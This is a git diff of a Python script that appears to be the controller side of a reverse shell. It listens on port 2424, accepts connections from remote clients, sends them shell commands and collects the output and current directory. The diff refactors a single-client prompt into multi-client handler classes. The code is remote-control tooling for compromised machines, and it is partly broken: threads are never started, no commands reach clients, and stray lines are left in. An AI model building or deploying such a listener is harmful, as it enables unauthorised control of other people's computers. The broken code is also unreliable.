@@ -1,60 +1,103 @@
 import socket
-import hellobitch.cryptofernet as crypt
-#have python 2.9
-__ENCODING__ = 'utf-8'
-SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 2424
-BUFFER_SIZE = 1024 * 128 # 128KB max size of messages, feel free to increase
-# separator string for sending 2 messages in one go
-SEPARATOR = "<sep>"
+import threading
+import time
+import multiprocessing
+import os
 
-# create a socket object
-s = socket.socket()
 
-# bind the socket to all IP addresses of this host
-s.bind((SERVER_HOST, SERVER_PORT))
-print("start")
-s.listen(5)
+connection_list = []
 
-# accept any connections attempted
-(client_socket, client_address) = s.accept()
-print(f"{client_address[0]}:{client_address[1]} Connected!")
+class SocketHandler(multiprocessing.Process):
+    def __init__(self, server_host, server_port):
+        self.server_host = server_host
+        self.server_port = server_port
 
-# receiving the current working directory of the client
-__CLEF__ = client_socket.recv(BUFFER_SIZE).decode(encoding=__ENCODING__)
-working_directory = crypt.decrypt_str(__CLEF__, client_socket.recv(BUFFER_SIZE)).decode()
-print("[+] Current working directory:", working_directory)
+    def handle(self):
+        global connection_list
+        # create a socket object
+        sock = socket.socket()
+        # bind the socket to all IP addresses of this host
+        sock.bind((self.server_host, self.server_port))
+        sock.listen(5)
+        while True:
+            # accept any connections attempted
+            client_sock, client_ip = sock.accept()
+            current_client = ClientHandler(client_sock, client_ip)
+            connection_list.append([current_client,None])
+            a=1+1
 
-while True:
-    # get the command from prompt
+class ClientHandler(multiprocessing.Process):
 
-    command = input(f"{working_directory} $> ")
-    command_encrypt = crypt.encrypt_str(__CLEF__, command)
-    if not command.strip():
-        # empty command
-        continue
-    # send the command to the client
-    client_socket.send(command.encode())
-    if command.lower() == "exit":
-        # if the command is exit, just break out of the loop
-        break
-    # retrieve command results
-    output = client_socket.recv(BUFFER_SIZE).decode()
+    def __init__(self, socket, ip, command=None):
+        super(ClientHandler, self).__init__()
+        self.ENCODING = 'utf-8'
+        self.BUFFER_SIZE = 1024 * 128  # 128KB max size of messages, feel free to increase
+        self.SEPARATOR = "<sep>"  # separator string for sending 2 messages in one go
+        self.command = command or ''
+        self.current_dir = ''
+        self.last_response = ''
+        self.socket = socket
+        self.ip = ip
 
-    output = crypt.decrypt_str(__CLEF__, output)
-    # split command output and current directory
-    try:
-        results, cwd = output.split(bytes(SEPARATOR,encoding="utf-8"))
-        results = str(results.decode(encoding=__ENCODING__))
-    except:
-        results = output
-    if __debug__ :
-        print('results', results)
-    results = results.replace("\\\\", "\\")
-    # print output
-    print(results)
-    # write to file
+    def handle(self):
+        global connection_list
+        ### print(f"{self.ip}: Connected!")
 
-    #analyse file
+        # receiving the current working directory of the client
+        self.current_dir = self.socket.recv(self.BUFFER_SIZE).decode(encoding=self.ENCODING)
+        ###print("[+] Current working directory:", current_dir)
 
-    #schedule client task
+        while True:
+            # get the command from prompt
+            # command = input(f'{current_dir} $> ')
+            if not self.command.strip():
+                time.sleep(1)
+                continue  # noting to do
+
+            # send the command to the client...
+            self.socket.send((self.command.encode()))
+            if self.command.lower() == 'exit':
+                break  # ...then if the command is exit, just break out of the loop
+
+            # retrieve command results then split command output and current directory
+            self.last_response, self.current_dir = self.socket.recv(self.BUFFER_SIZE) \
+                .decode(encoding=self.ENCODING).split(self.SEPARATOR)
+
+            if __debug__:
+                print('results', self.last_response)
+
+            # results = results.replace("\\\\", "\\")
+            # print(results)  # print output
+
+    # sock.close()  # close server connection
+
+def look():
+    __con_lst = []
+    while True:
+        print(__con_lst)
+        if not __con_lst == connection_list:
+            for e in connection_list:
+                if not __con_lst.__contains__(e[0]):
+                    e[1] = threading.Thread(target=e[0].handle)
+                    print(f'New connection added {e[0].ip}')
+
+
+def main():
+    global connection_list
+    SERVER_HOST = "0.0.0.0"
+    SERVER_PORT = 2424
+
+    sock_handler = SocketHandler(server_host=SERVER_HOST, server_port=SERVER_PORT)
+    threading.Thread(target=look).start()
+    threading.Thread(target=sock_handler.handle).start()
+    input()
+
+
+
+
+
+
+
+if __name__ == '__main__':
+    multiprocessing.set_start_method('spawn', force=True)
+    main()
